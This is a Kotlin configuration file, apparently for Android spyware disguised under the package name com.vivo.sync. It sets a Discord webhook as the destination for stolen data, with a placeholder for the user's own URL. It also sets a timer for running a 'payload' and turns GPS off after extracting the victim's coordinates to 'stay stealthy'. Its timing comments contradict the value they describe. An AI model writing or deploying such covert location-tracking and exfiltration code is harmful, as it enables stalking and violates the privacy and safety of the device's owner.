package com.vivo.sync

object Config {
    // Webhook destination (Discord)
    const val WEBHOOK_URL = "PUT-YOUR-WEBHOOK_URL"

    // Interval to execute the payload (Default: 300000ms = 5 minutes). Can be set to lower for testing.
    const val INTERVAL_MS = 600000L // Set to 1 minute for instant testing

    // Automatically turn off GPS after extracting coordinates to stay stealthy
    const val AUTO_TURN_OFF_GPS = true
}
